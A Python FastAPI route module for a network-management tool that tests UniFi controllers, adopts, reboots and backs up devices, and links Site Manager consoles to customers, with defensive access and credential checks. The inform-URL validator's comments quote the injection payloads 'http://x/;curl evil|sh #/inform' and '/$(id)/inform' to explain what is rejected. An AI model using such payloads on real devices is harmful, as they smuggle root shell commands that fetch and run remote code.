"""UniFi and network route handlers."""

from __future__ import annotations

import logging
import re

from fastapi import APIRouter, Depends, Request
from fastapi.responses import JSONResponse

from app.core.exceptions import (
    ForbiddenError,
    IntegrationError,
    NotFoundError,
    ValidationError,
)
from app.core.rbac import check_customer_access, get_accessible_customer_ids
from app.core.validation import validate_host
from app.models.network import (
    NetworkConfigBackup,
    NetworkScanRequest,
    SiteManagerAuth,
    SiteManagerVerify2fa,
    SiteMatchesApply,
    UniFiDeviceLogin,
    UniFiDeviceTest,
    UniFiSaveRequest,
    UniFiSetInform,
    UniFiTestRequest,
)
from app.models.user import Role, User
from app.web.i18n import keyed, refusal, ui_t
from app.web.middleware.auth import (
    get_current_user,
    require_customer_access,
    require_role,
)

router = APIRouter()
logger = logging.getLogger(__name__)


# ── Site Manager scope ───────────────────────────────────────────────────────
# The Site Manager key belongs to the MSP's ui.com account and answers for
# every console in it. Nothing ties a console to a customer that a technician
# could not write themselves (UniFiHostId is set through /unifi/site-matches/
# apply with only customer access), so it cannot be filtered per customer.
# These views are for callers who may see every customer anyway.


async def _is_unrestricted(user: User) -> bool:
    return await get_accessible_customer_ids(user) is None


async def _require_unrestricted(user: User) -> None:
    if not await _is_unrestricted(user):
        logger.info("403 site-manager: user=%s is customer-scoped", user.username)
        raise refusal(ForbiddenError, "err_unifi_msp_wide")


@router.post("/unifi/test")
async def unifi_test(
    body: UniFiTestRequest, request: Request, user: User = Depends(require_role(Role.technician))
):
    """Test UniFi Controller connectivity with a login the caller supplies.

    The hub connects, from inside the MSP's network, to an address the caller
    picks. So: technician only, a validated address, and a failure reported as
    a category rather than the exception text, since telling "refused" from
    "timed out" from "TLS error" maps out what listens on any host:port the
    caller names. The detail goes to the server log.

    With no password and a ``customer_id``, the login stored for that
    customer's controller is used, but only against the address it was
    stored for, so the customer page's edit form can test a saved controller
    without the browser holding the password.
    """
    from app.modules.unifi_audit.client import UniFiControllerClient

    raw_host = (body.host or "").strip()
    username = (body.username or "").strip()
    password = (body.password or "").strip()
    is_unifi_os = body.is_unifi_os

    if not raw_host:
        raise refusal(ValidationError, "err_unifi_credentials_required")
    base_url = _controller_base_url(raw_host)
    if not password and body.customer_id:
        username, password = await _stored_controller_login(body.customer_id, base_url, user)
    if not username or not password:
        raise refusal(ValidationError, "err_unifi_credentials_required")

    try:
        async with UniFiControllerClient(
            base_url, username, password, is_unifi_os=is_unifi_os
        ) as uf:
            result = await uf.test_connection()
    except Exception as e:
        result = {"ok": False, "error": f"{type(e).__name__}: {e}"}
    if result.get("ok"):
        return result
    logger.warning("UniFi test for %s failed: %s", base_url, result.get("error"))
    key = (
        "err_device_test_auth"
        if _REJECTED_LOGIN.search(result.get("error") or "")
        else "err_device_test_unreachable"
    )
    return {"ok": False, "error": ui_t(key, request), "error_key": key}


async def _stored_controller_login(customer_id: str, base_url: str, user: User) -> tuple[str, str]:
    """The customer's stored controller login if it was stored for this address."""
    from app.core.credentials import get_secret
    from app.core.customer import CustomerManager

    if not await check_customer_access(user, customer_id):
        raise refusal(ForbiddenError, "err_customer_access_denied")
    config = CustomerManager.get_customer(customer_id)
    if not config:
        raise refusal(NotFoundError, "err_customer_not_found")
    stored = (config.get("UniFiHost") or "").strip()
    try:
        same = bool(stored) and _controller_base_url(stored).casefold() == base_url.casefold()
    except ValidationError:
        same = False
    if not same:
        return "", ""
    return (
        get_secret(customer_id, "unifi_username") or "",
        get_secret(customer_id, "unifi_password") or "",
    )


# A controller that answers with one of these is reachable and refused the
# login. Everything else (refused, timed out, TLS, DNS) reads as unreachable.
_REJECTED_LOGIN = re.compile(r"\bHTTP 40[013]\b")


def _controller_base_url(raw: str) -> str:
    """Normalise a controller address to ``scheme://host[:port]``, or raise.

    Accepts a bare host, host:port, or a URL with nothing after the authority.
    Rebuilt from the parsed parts so nothing outside them survives.
    """
    from urllib.parse import urlparse

    url = raw if "://" in raw else "https://" + raw
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise refusal(ValidationError, "err_unifi_address_scheme")
    try:
        hostname, port = parsed.hostname, parsed.port
    except ValueError as e:
        raise refusal(ValidationError, "err_unifi_address_bad_port") from e
    if not hostname:
        raise refusal(ValidationError, "err_unifi_address_no_host")
    validate_host(hostname, "host")
    if (
        parsed.path not in ("", "/")
        or parsed.params
        or parsed.query
        or parsed.fragment
        or parsed.username
        or parsed.password
    ):
        raise refusal(ValidationError, "err_unifi_address_host_port_only")
    netloc_host = f"[{hostname}]" if ":" in hostname else hostname
    port_part = f":{port}" if port else ""
    return f"{parsed.scheme}://{netloc_host}{port_part}"


@router.post("/unifi/test-device")
async def unifi_test_device(
    body: UniFiDeviceTest, user: User = Depends(require_role(Role.technician))
):
    """Test direct connectivity to a standalone UniFi device."""
    from app.modules.unifi_audit.client import UniFiDirectDevice

    host, username, password = await _device_login(body, user)
    device_type = body.device_type

    async with UniFiDirectDevice(host, username, password, device_type=device_type) as dev:
        result = await dev.test_connection()
        return result


def _validated_inform_url(raw: str) -> str:
    """Normalise and validate a controller inform URL.

    The old check was ``startswith("http")`` and ``endswith("/inform")``, which
    a payload like ``http://x/;curl evil|sh #/inform`` satisfies — and the
    result was interpolated into a root shell command on the device. Parse it
    properly instead: scheme, host through the same validator the rest of the
    app uses, and a path that *ends* with /inform (UniFi's own proxy form is
    /proxy/network/inform, so an equality check would reject a legitimate URL).
    """
    from urllib.parse import urlparse

    from app.core.validation import validate_host

    url = raw.strip()
    if not url:
        raise refusal(ValidationError, "err_unifi_inform_required")
    if "://" not in url:
        url = "http://" + url
    if not url.rstrip("/").endswith("/inform"):
        url = url.rstrip("/") + "/inform"

    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise refusal(ValidationError, "err_unifi_inform_scheme")
    try:
        hostname, port = parsed.hostname, parsed.port
    except ValueError as e:
        # urlparse defers parsing the port until the attribute is read, and
        # then raises plain ValueError — "x:99999" and "x:abc" both reached the
        # global handler as a 500 "internal error" instead of telling the
        # technician their URL was malformed.
        raise refusal(ValidationError, "err_unifi_inform_bad_port", error=e) from e
    if not hostname:
        raise refusal(ValidationError, "err_unifi_inform_no_host")
    validate_host(hostname, "controller_url")
    if parsed.query or parsed.fragment or parsed.params:
        raise refusal(ValidationError, "err_unifi_inform_query")
    # Restrict the path to unreserved URL characters. Without this, a path like
    # /$(id)/inform parses cleanly and ends with /inform — shlex.quote at the
    # command boundary neutralises it, but there is no reason for the route to
    # accept a string that is obviously not an inform endpoint.
    if not re.fullmatch(r"[A-Za-z0-9._~/-]*/inform", parsed.path):
        raise refusal(ValidationError, "err_unifi_inform_path")
    # urlparse strips the brackets off an IPv6 literal, so rebuilding from
    # .hostname alone turns http://[::1]:8443/inform into http://::1:8443/inform
    # — which the device cannot resolve and which no longer round-trips.
    netloc_host = f"[{hostname}]" if ":" in hostname else hostname
    port_part = f":{port}" if port else ""
    # Rebuild from the parsed parts so nothing outside them survives.
    return f"{parsed.scheme}://{netloc_host}{port_part}{parsed.path}"


@router.post("/unifi/set-inform")
async def unifi_set_inform(
    body: UniFiSetInform, user: User = Depends(require_role(Role.technician))
):
    """Set inform URL on a direct UniFi device to adopt it to a controller."""
    from app.core.activity_log import log_activity
    from app.modules.unifi_audit.client import UniFiDirectDevice

    host, username, password = await _device_login(body, user)
    controller_url = _validated_inform_url(body.controller_url)

    log_activity(
        "unifi_set_inform",
        detail=f"Satte inform-URL på {host} til {controller_url}",
        user=user.username,
    )
    async with UniFiDirectDevice(host, username, password) as dev:
        return await dev.set_inform(controller_url)


@router.post("/unifi/reboot-device")
async def unifi_reboot_device(
    body: UniFiDeviceLogin, user: User = Depends(require_role(Role.technician))
):
    """Reboot a direct UniFi device."""
    from app.core.activity_log import log_activity
    from app.modules.unifi_audit.client import UniFiDirectDevice

    host, username, password = await _device_login(body, user)

    # Taking a customer's access point down is disruptive and, until now,
    # anonymous — this router recorded nothing at all.
    log_activity("unifi_reboot_device", detail=f"Startet {host} på nytt", user=user.username)
    async with UniFiDirectDevice(host, username, password) as dev:
        return await dev.reboot()


@router.post("/unifi/device-config")
async def unifi_device_config(
    body: UniFiDeviceLogin, user: User = Depends(require_role(Role.technician))
):
    """Dump running config from a direct UniFi device."""
    from app.core.activity_log import log_activity
    from app.modules.unifi_audit.client import UniFiDirectDevice

    host, username, password = await _device_login(body, user)

    log_activity(
        "unifi_device_config", detail=f"Hentet konfigurasjon fra {host}", user=user.username
    )
    async with UniFiDirectDevice(host, username, password) as dev:
        return await dev.get_config_dump()


@router.post("/network/scan")
async def network_scan_subnet(
    body: NetworkScanRequest, user: User = Depends(require_role(Role.technician))
):
    """Scan a subnet for UniFi devices."""
    from app.modules.unifi_audit.scanner import scan_subnet

    subnet = body.subnet.strip()
    if not subnet:
        raise refusal(ValidationError, "err_unifi_subnet_required")

    results = await scan_subnet(subnet, max_concurrent=body.max_concurrent)
    if results and "error" in results[0]:
        raise ValidationError(results[0]["error"])

    return {"subnet": subnet, "found": results, "count": len(results)}


@router.post("/network/save-config-backup/{customer_id}")
async def network_save_config_backup(
    customer_id: str,
    body: NetworkConfigBackup,
    user: User = Depends(require_customer_access(Role.technician)),
):
    """Save a device config dump to the named customer's audit directory."""
    from app.core.config import get_audit_dir
    from app.core.customer import CustomerManager
    from app.core.encryption import encrypted_write_text

    host = body.host.strip()
    config_text = body.config
    if not host or not config_text:
        raise refusal(ValidationError, "err_unifi_host_config_required")

    active = CustomerManager.get_customer(customer_id)
    if not active:
        raise refusal(NotFoundError, "err_customer_not_found")

    # Save to customer audit dir under network_configs/
    from datetime import datetime

    safe_name = active.get("CustomerName", "unknown").replace(" ", "_")
    audit_dir = get_audit_dir() / safe_name / "network_configs"
    audit_dir.mkdir(parents=True, exist_ok=True)

    timestamp = datetime.now().strftime("%Y-%m-%d_%H%M")
    safe_host = host.replace(".", "_").replace(":", "_")
    filename = f"{timestamp}_{safe_host}.cfg"
    filepath = audit_dir / filename

    encrypted_write_text(filepath, config_text)

    return {"ok": True, "path": str(filepath), "filename": filename}


@router.get("/network/config-backups/{customer_id}")
async def network_list_config_backups(
    customer_id: str, user: User = Depends(require_customer_access(Role.viewer))
):
    """List the named customer's saved network config backups."""
    from app.core.config import get_audit_dir
    from app.core.customer import CustomerManager

    active = CustomerManager.get_customer(customer_id)
    if not active:
        raise refusal(NotFoundError, "err_customer_not_found")

    safe_name = active.get("CustomerName", "unknown").replace(" ", "_")
    backup_dir = get_audit_dir() / safe_name / "network_configs"
    if not backup_dir.exists():
        return {"backups": []}

    backups = []
    for f in sorted(backup_dir.glob("*.cfg"), reverse=True):
        parts = f.stem.split("_", 2)
        backups.append(
            {
                "filename": f.name,
                "path": str(f),
                "timestamp": parts[0] + " " + parts[1] if len(parts) >= 2 else f.stem,
                "host": parts[2].replace("_", ".") if len(parts) >= 3 else "",
                "size": f.stat().st_size,
            }
        )

    return {"backups": backups}


@router.post("/unifi/save/{customer_id}")
async def unifi_save(
    customer_id: str,
    body: UniFiSaveRequest,
    user: User = Depends(require_customer_access(Role.technician)),
):
    """Save UniFi config for the customer named in the path.

    The stored controller login is sent to the controller host and, in direct
    mode, to every device that has no login of its own. Adding an address to
    that set without supplying a password in the same request deletes the
    stored login, so it cannot be collected by pointing the customer at a
    host the caller controls. That holds for admins too.
    """
    from app.core.activity_log import log_activity
    from app.core.credentials import delete_secret, get_secret, store_secret
    from app.core.customer import CustomerManager

    # Named in the path, never "the active customer": a switch made in another
    # tab used to decide whose controller this login was stored for.
    cust_id = customer_id
    config = CustomerManager.get_customer(cust_id)
    if not config:
        raise refusal(NotFoundError, "err_customer_not_found")

    # Absent means "leave alone". Writing each field unconditionally from the
    # body meant a partial save reset everything it did not mention — the same
    # defect as /fortigate/save, where an omitted host blanked the address
    # while the stored controller credentials stayed behind.
    old_host = (config.get("UniFiHost") or "").strip()
    old_targets = _stored_login_targets(config)
    if body.mode is not None:
        config["UniFiMode"] = body.mode or "controller"  # "controller" or "direct"
    if body.host is not None:
        host = body.host.strip()
        if host:
            validate_host(host, "host")
        config["UniFiHost"] = host
    if body.is_unifi_os is not None:
        config["UniFiIsUniFiOS"] = body.is_unifi_os
    if body.site is not None:
        config["UniFiSite"] = body.site.strip() or "default"

    # Save direct devices list (always update when mode is direct)
    devices = _keep_stored_device_passwords(body.devices or [], config)
    for dev in devices:
        dev_host = str(dev.get("host") or "").strip()
        if dev_host:
            validate_host(dev_host, "host")
    if body.mode == "direct" or devices:
        config["UniFiDirectDevices"] = devices

    username = (body.username or "").strip()
    password = (body.password or "").strip()
    new_targets = _stored_login_targets(config) - old_targets
    has_login = bool(get_secret(cust_id, "unifi_password") or get_secret(cust_id, "unifi_username"))
    login_cleared = bool(new_targets) and not password and has_login
    if login_cleared:
        delete_secret(cust_id, "unifi_password")
        delete_secret(cust_id, "unifi_username")
    if username:
        store_secret(cust_id, "unifi_username", username)
    if password:
        store_secret(cust_id, "unifi_password", password)

    save_data = {k: v for k, v in config.items() if not k.startswith("_")}
    CustomerManager.save_customer(save_data)

    new_host = (config.get("UniFiHost") or "").strip()
    detail = f"Lagret UniFi-oppsett for {config.get('CustomerName', cust_id)}"
    if new_host != old_host:
        detail += f" — adresse endret fra {old_host or '(ingen)'} til {new_host or '(ingen)'}"
    if password:
        detail += " — nytt passord lagret"
    if login_cleared:
        detail += "; lagret innlogging slettet fordi en ny adresse ble lagt til"
    log_activity("unifi_save", detail=detail, customer=cust_id, user=user.username)

    return {"ok": True, "credentials_cleared": login_cleared}


def _keep_stored_device_passwords(devices: list[dict], config: dict) -> list[dict]:
    """The device list as sent, each device that came without a password
    keeping the one stored for its address.

    /network-devices no longer sends device passwords to the browser, so the
    list the customer page saves back holds a password only for a device
    whose password was typed in this time. ``has_password`` is what the
    listing says in its place and is not stored.
    """
    stored = {
        str(d.get("host") or "").strip().casefold(): d["password"]
        for d in config.get("UniFiDirectDevices") or []
        if isinstance(d, dict) and d.get("password")
    }
    kept = []
    for dev in devices:
        dev = {k: v for k, v in dev.items() if k != "has_password"}
        if not str(dev.get("password") or "").strip():
            dev.pop("password", None)
            previous = stored.get(str(dev.get("host") or "").strip().casefold())
            if previous:
                dev["password"] = previous
        kept.append(dev)
    return kept


def _stored_device(config: dict, host: str) -> dict | None:
    """The customer's direct device at this address, if it has one."""
    want = host.strip().casefold()
    for dev in config.get("UniFiDirectDevices") or []:
        if isinstance(dev, dict) and str(dev.get("host") or "").strip().casefold() == want:
            return dev
    return None


async def _device_login(body: UniFiDeviceLogin, user: User) -> tuple[str, str, str]:
    """The address, user name and password a device action connects with.

    The login in the request, unless the request names the device's customer
    and leaves the password out. Then a device of that customer's direct list
    uses its stored login, falling back to the customer's stored UniFi login
    and then the factory one, exactly as the poller and the network audit do.
    That is how the customer page reaches a saved device: /network-devices no
    longer sends device passwords to the browser. An address that is not on
    the customer's list gets only what the request carried, so naming a
    customer cannot send its stored login to an address of the caller's.
    """
    from app.core.credentials import get_secret
    from app.core.customer import CustomerManager

    host = body.host.strip()
    if not host:
        raise refusal(ValidationError, "err_host_ip_required")
    validate_host(host, "host")
    username, password = body.username.strip(), body.password.strip()
    customer_id = (body.customer_id or "").strip()
    if not customer_id or "password" in body.model_fields_set:
        return host, username, password
    if not await check_customer_access(user, customer_id):
        raise refusal(ForbiddenError, "err_customer_access_denied")
    config = CustomerManager.get_customer(customer_id)
    if not config:
        raise refusal(NotFoundError, "err_customer_not_found")
    dev = _stored_device(config, host)
    if dev is None:
        return host, username, password
    username = (
        str(dev.get("username") or "").strip()
        or get_secret(customer_id, "unifi_username")
        or "ubnt"
    )
    password = str(dev.get("password") or "") or get_secret(customer_id, "unifi_password") or "ubnt"
    return host, username, password


def _stored_login_targets(config: dict) -> set[str]:
    """Every address the customer's stored UniFi login would be sent to.

    The controller host, plus each direct device without its own password:
    the poller and the network audit fall back to the stored login for those.
    """
    targets = set()
    controller = (config.get("UniFiHost") or "").strip()
    if controller:
        targets.add(controller.casefold())
    for dev in config.get("UniFiDirectDevices") or []:
        if not isinstance(dev, dict) or dev.get("password"):
            continue
        dev_host = str(dev.get("host") or "").strip()
        if dev_host:
            targets.add(dev_host.casefold())
    return targets


@router.post("/network/quick-audit/{customer_id}")
async def network_quick_audit(
    customer_id: str, user: User = Depends(require_customer_access(Role.technician))
):
    """Run a quick network audit of the named customer's FortiGate and/or UniFi."""
    import json as _json

    from app.core.customer import CustomerManager
    from app.services.network_audit import run_quick_network_audit

    active = CustomerManager.get_customer(customer_id)
    if not active:
        raise refusal(NotFoundError, "err_customer_not_found")

    cust_id = customer_id
    results = await run_quick_network_audit(active, cust_id)

    if not results["fortigate"] and not results["unifi"]:
        raise refusal(ValidationError, "err_unifi_no_devices")

    # Clean results for JSON serialization
    try:
        clean = _json.loads(_json.dumps(results, default=str))
    except (TypeError, ValueError):
        clean = results

    # Persist results to audit directory
    try:
        from datetime import datetime as _dt

        from app.core.config import get_audit_dir
        from app.core.encryption import encrypted_write_text

        safe_name = active.get("CustomerName", "unknown").replace(" ", "_")
        audit_base = get_audit_dir() / safe_name
        runs = sorted(audit_base.glob("20*_*"), reverse=True) if audit_base.exists() else []
        if runs:
            net_dir = runs[0]
        else:
            ts = _dt.now().strftime("%Y-%m-%d_%H%M")
            net_dir = audit_base / ts
            net_dir.mkdir(parents=True, exist_ok=True)

        if clean.get("fortigate") and "error" not in clean["fortigate"]:
            encrypted_write_text(
                net_dir / "60_fortigate_audit.txt",
                _json.dumps(clean["fortigate"], indent=2, default=str),
            )
        if clean.get("unifi") and "error" not in clean["unifi"]:
            encrypted_write_text(
                net_dir / "61_unifi_audit.txt", _json.dumps(clean["unifi"], indent=2, default=str)
            )
        logger.info("Network audit results saved to %s", net_dir)
    except Exception as e:
        logger.warning("Failed to save network audit results: %s", e)

    return JSONResponse(content=clean)


@router.get("/network-devices/{customer_id}")
async def get_network_devices(
    customer_id: str, user: User = Depends(require_customer_access(Role.viewer))
):
    """Return the named customer's configured network devices.

    No secret leaves the server. The direct devices' SSH passwords were sent
    whole, to any viewer of the customer, because the device buttons sent
    them back to log in; those buttons now name the customer and the server
    looks the login up (_device_login). Each device says ``has_password``.
    """
    from app.core.credentials import get_secret
    from app.core.customer import CustomerManager

    active = CustomerManager.get_customer(customer_id)
    if not active:
        raise refusal(NotFoundError, "err_customer_not_found")

    cust_id = customer_id
    fg = None
    if active.get("FortiGateHost"):
        fg = {
            "host": active["FortiGateHost"],
            "port": active.get("FortiGatePort", 443),
            "vdom": active.get("FortiGateVDOM", "root"),
            "verify_ssl": active.get("FortiGateVerifySSL", True),
            "has_token": bool(get_secret(cust_id, "fortigate_api_token")),
            # Removing the device then needs an admin (DELETE /fortigate/{id}).
            "has_admin_password": bool(get_secret(cust_id, "fortigate_admin_password")),
        }

    uf = None
    unifi_mode = active.get("UniFiMode", "controller")
    if active.get("UniFiHost") or active.get("UniFiDirectDevices"):
        uf = {
            "mode": unifi_mode,
            "host": active.get("UniFiHost", ""),
            "is_unifi_os": active.get("UniFiIsUniFiOS", False),
            "site": active.get("UniFiSite", "default"),
            "has_credentials": bool(get_secret(cust_id, "unifi_username")),
            "direct_devices": [
                {k: v for k, v in dev.items() if k != "password"}
                | {"has_password": bool(dev.get("password"))}
                for dev in active.get("UniFiDirectDevices") or []
                if isinstance(dev, dict)
            ],
        }

    return {"fortigate": fg, "unifi": uf}


@router.delete("/unifi/{customer_id}")
async def unifi_remove(
    customer_id: str,
    user: User = Depends(require_customer_access(Role.technician)),
):
    """Unlink UniFi from the named customer: controller, site, direct devices, login.

    /unifi/save cannot do this: it leaves fields it is not sent alone, and an
    empty device list in controller mode is not written at all. The Site
    Manager console match (UniFiHostId, set through /unifi/site-matches) is a
    separate link and stays. No device or controller is contacted; their
    stored firmware readings go.
    """
    from app.core.activity_log import log_activity
    from app.core.credentials import delete_secret, get_secret
    from app.core.customer import CustomerManager

    config = CustomerManager.get_customer(customer_id)
    if not config:
        raise refusal(NotFoundError, "err_customer_not_found")
    old_host = (config.get("UniFiHost") or "").strip()
    devices = len(config.get("UniFiDirectDevices") or [])
    save_data = {
        k: v for k, v in config.items() if not k.startswith("_") and k not in _UNIFI_LINK_FIELDS
    }
    CustomerManager.save_customer(save_data)
    for name in ("unifi_username", "unifi_password"):
        if get_secret(customer_id, name):
            delete_secret(customer_id, name)
    # The devices' last firmware readings would otherwise stay in Varsler.
    from app.services import firmware_inventory

    await firmware_inventory.record_quietly(firmware_inventory.forget, customer_id, "unifi")

    what = old_host or f"{devices} direkte enheter"
    log_activity(
        "unifi_remove",
        detail=f"Fjernet UniFi ({what}) fra {config.get('CustomerName', customer_id)}",
        customer=customer_id,
        user=user.username,
    )
    return {"ok": True}


# The customer fields /unifi/save writes, which DELETE /unifi/{id} clears.
_UNIFI_LINK_FIELDS = ("UniFiHost", "UniFiSite", "UniFiIsUniFiOS", "UniFiMode", "UniFiDirectDevices")


# ═══════════════════════════════════════════════════════════════════════════════
# Enhanced UniFi API endpoints (require technician role)
# ═══════════════════════════════════════════════════════════════════════════════


@router.get("/unifi/clients/{customer_id}")
async def unifi_clients(
    customer_id: str,
    user: User = Depends(require_customer_access(Role.technician)),
):
    """Get all connected clients for a customer's UniFi site."""
    from app.modules.api_result import read_error, read_failed
    from app.services.unifi_api import get_client_inventory

    try:
        clients = await get_client_inventory(customer_id)
        # A refused read is not an empty site. Report it unavailable rather than
        # "0 clients", which reads as a customer with nothing connected.
        if read_failed(clients):
            return {
                "ok": False,
                "unavailable": True,
                "error": read_error(clients),
                "clients": [],
                "count": None,
                "wireless": None,
                "wired": None,
            }
        wireless = sum(1 for c in clients if c["type"] == "wireless")
        wired = len(clients) - wireless
        return {
            "ok": True,
            "clients": clients,
            "count": len(clients),
            "wireless": wireless,
            "wired": wired,
        }
    except ValueError as e:
        raise ValidationError(str(e)) from e
    except Exception as e:
        logger.exception("unifi_clients failed for %s", customer_id)
        raise IntegrationError(str(e)) from e


@router.get("/unifi/wifi-health/{customer_id}")
async def unifi_wifi_health(
    customer_id: str,
    user: User = Depends(require_customer_access(Role.technician)),
):
    """Get WiFi health overview for a customer's UniFi site."""
    from app.services.unifi_api import get_wifi_health

    try:
        data = await get_wifi_health(customer_id)
        return {"ok": True, **data}
    except ValueError as e:
        raise ValidationError(str(e)) from e
    except Exception as e:
        logger.exception("unifi_wifi_health failed for %s", customer_id)
        raise IntegrationError(str(e)) from e


@router.get("/unifi/dashboard/{customer_id}")
async def unifi_dashboard(
    customer_id: str,
    user: User = Depends(require_customer_access(Role.technician)),
):
    """Enhanced device stats for all devices on the customer's controller."""
    from app.modules.api_result import read_error, read_failed
    from app.services.unifi_api import get_enhanced_device_stats

    try:
        devices = await get_enhanced_device_stats(customer_id)
        # A refused controller read is not an empty fleet. Say unavailable rather
        # than "0 devices", which reads as a customer with no managed hardware.
        if read_failed(devices):
            return {
                "ok": False,
                "unavailable": True,
                "error": read_error(devices),
                "devices": [],
                "count": None,
            }
        return {"ok": True, "devices": devices, "count": len(devices)}
    except ValueError as e:
        raise ValidationError(str(e)) from e
    except Exception as e:
        logger.exception("unifi_dashboard failed for %s", customer_id)
        raise IntegrationError(str(e)) from e


@router.post("/unifi/site-manager/auth")
async def unifi_site_manager_auth(
    body: SiteManagerAuth,
    request: Request,
    user: User = Depends(require_role(Role.technician)),
):
    """Authenticate with UniFi Site Manager via API key or SSO credentials."""
    from app.services.unifi_api import site_manager_authenticate

    api_key = body.api_key.strip()
    username = body.username.strip()
    password = body.password.strip()
    customer_id = body.customer_id or None

    if not api_key and (not username or not password):
        raise refusal(ValidationError, "err_unifi_cloud_credentials_required")
    # customer_id decides whose cloud token gets overwritten.
    if customer_id and not await check_customer_access(user, customer_id):
        raise refusal(ForbiddenError, "err_customer_access_denied")

    result = await site_manager_authenticate(
        username=username or None,
        password=password or None,
        api_key=api_key or None,
        store_for_customer=customer_id,
    )
    if result.get("ok"):
        return {"ok": True, "method": result.get("method", "unknown")}
    # 2FA required — pass session token back to client for the second step
    if result.get("requires_2fa"):
        return JSONResponse(
            {
                "ok": False,
                "requires_2fa": True,
                "session_token": result.get("session_token", ""),
                # The service says this in Norwegian whoever asked.
                **keyed("error", "lbl_2fa_required", request),
                # Echo back customer_id so the frontend can pass it to verify
                "customer_id": customer_id or "",
            },
            status_code=200,
        )
    # Use 400 (not 401!) — 401 would trigger JWT refresh/logout in the frontend
    if result.get("error"):
        raise ValidationError(result["error"])
    raise refusal(ValidationError, "err_unknown")


@router.post("/unifi/site-manager/verify-2fa")
async def unifi_site_manager_verify_2fa(
    body: SiteManagerVerify2fa,
    user: User = Depends(require_role(Role.technician)),
):
    """Complete UniFi Site Manager SSO 2FA verification."""
    from app.services.unifi_api import site_manager_verify_2fa

    session_token = body.session_token.strip()
    code = body.code.strip()
    customer_id = body.customer_id or None

    if not session_token or not code:
        raise refusal(ValidationError, "err_unifi_2fa_required")
    if customer_id and not await check_customer_access(user, customer_id):
        raise refusal(ForbiddenError, "err_customer_access_denied")

    result = await site_manager_verify_2fa(
        session_token=session_token,
        totp_code=code,
        store_for_customer=customer_id,
    )
    if result.get("ok"):
        return {"ok": True, "method": result.get("method", "sso")}
    if result.get("error"):
        raise ValidationError(result["error"])
    raise refusal(ValidationError, "err_unknown")


@router.get("/unifi/site-manager/sites")
async def unifi_site_manager_sites(
    request: Request,
    user: User = Depends(require_role(Role.technician)),
):
    """List cloud-managed sites from ui.com Site Manager.

    Without a customer cloud token this falls back to the MSP-wide Site
    Manager key and lists every console in the account, so a customer-scoped
    caller needs a customer they have access to that has its own token.
    """
    from app.core.credentials import get_secret
    from app.services.unifi_api import site_manager_list_sites

    customer_id = request.query_params.get("customer_id") or None
    own_token = bool(
        customer_id
        and await check_customer_access(user, customer_id)
        and get_secret(customer_id, "ui_cloud_token")
    )
    if not own_token and not await _is_unrestricted(user):
        raise refusal(ForbiddenError, "err_unifi_msp_wide")
    result = await site_manager_list_sites(customer_id=customer_id)

    if not result.get("ok"):
        error_msg = result.get("error")
        if not error_msg:
            raise refusal(ValidationError, "err_unknown")
        if "expired" in error_msg.lower():
            raise IntegrationError(
                "UniFi-innloggingen er utløpt. Koble til UniFi på nytt.",
                message_key="err_unifi_session",
            )
        raise ValidationError(error_msg)
    return result


@router.get("/unifi/firmware-check/{customer_id}")
async def unifi_firmware_check(
    customer_id: str,
    user: User = Depends(require_customer_access(Role.technician)),
):
    """Check all devices against the firmware database for outdated/EOL firmware."""
    from app.services.unifi_api import firmware_check_all

    try:
        result = await firmware_check_all(customer_id)
        return {"ok": True, **result}
    except ValueError as e:
        raise ValidationError(str(e)) from e
    except Exception as e:
        logger.exception("firmware_check failed for %s", customer_id)
        raise IntegrationError(str(e)) from e


@router.get("/unifi/controller-summary/{customer_id}")
async def unifi_controller_summary(
    customer_id: str,
    user: User = Depends(require_customer_access(Role.technician)),
):
    """Aggregate controller view: sites, devices, clients, WLANs, alarms."""
    from app.services.unifi_api import get_controller_summary

    try:
        summary = await get_controller_summary(customer_id)
        return {"ok": True, **summary}
    except ValueError as e:
        raise ValidationError(str(e)) from e
    except Exception as e:
        logger.exception("controller_summary failed for %s", customer_id)
        raise IntegrationError(str(e)) from e


# ── Site Manager: all devices ────────────────────────────────────────────────


@router.get("/unifi/sm/devices")
async def unifi_sm_devices(
    host_id: str = "",
    user: User = Depends(get_current_user),
):
    """Get all devices across all sites from Site Manager API."""
    from app.services.unifi_api import get_all_devices

    await _require_unrestricted(user)
    result = await get_all_devices(host_id or None)
    if not result.get("ok"):
        raise (
            ValidationError(result["error"])
            if result.get("error")
            else refusal(ValidationError, "err_unifi_devices_failed")
        )
    return result


# ── Site Manager: ISP metrics ────────────────────────────────────────────────


@router.get("/unifi/sm/isp-metrics")
async def unifi_sm_isp_metrics(
    metric_type: str = "1h",
    duration: str = "24h",
    user: User = Depends(get_current_user),
):
    """Get ISP performance metrics (bandwidth, latency, packet loss)."""
    from app.services.unifi_api import get_isp_metrics

    await _require_unrestricted(user)
    result = await get_isp_metrics(metric_type, duration)
    if not result.get("ok"):
        raise (
            ValidationError(result["error"])
            if result.get("error")
            else refusal(ValidationError, "err_unifi_isp_metrics_failed")
        )
    return result


# ── Matching cloud sites to customers ────────────────────────────────────────


@router.get("/unifi/site-matches")
async def unifi_site_matches(
    include_linked: bool = False,
    user: User = Depends(get_current_user),
):
    """Propose a customer for each console. Writes nothing.

    Matched on the console name, not the site name: a site is called "default"
    on 29 of 30 consoles in a live account and an opaque id on the rest, so
    matching on it proposed nothing for 76 of 77. The console carries the name
    a technician typed at adoption.

    Customers already carrying a console are left out, so a re-run proposes
    only what is still unlinked. Pass ``include_linked=true`` to reconsider
    everything — a deliberate act, since applying a second console to a
    customer overwrites the first.

    Every console in the account comes back, matched or not, so this is an
    all-customers view.
    """
    from app.core.customer import CustomerManager
    from app.core.rbac import filter_customers
    from app.services.unifi_api import (
        get_hosts_with_names,
        match_hosts_to_customers,
        summarise_host_matches,
    )

    await _require_unrestricted(user)
    listing = await get_hosts_with_names()
    if not listing.get("ok"):
        raise (
            ValidationError(listing["error"])
            if listing.get("error")
            else refusal(ValidationError, "err_unifi_hosts_failed")
        )

    allowed = await get_accessible_customer_ids(user)
    customers = filter_customers(CustomerManager.list_customers(), allowed)
    return summarise_host_matches(
        match_hosts_to_customers(listing.get("hosts", []), customers, include_linked=include_linked)
    )


@router.post("/unifi/site-matches/apply")
async def unifi_site_matches_apply(
    body: SiteMatchesApply,
    request: Request,
    user: User = Depends(require_role(Role.technician)),
):
    """Record the chosen site → customer links on the customer records.

    Applies exactly the pairs given, never the matcher's own guesses: a
    proposal is a suggestion until a person accepts it, and an ambiguous name
    resolved by score alone is a coin flip written into a customer record.

    This records ownership. It does not grant controller access — that still
    needs a host and a login stored against the customer.
    """
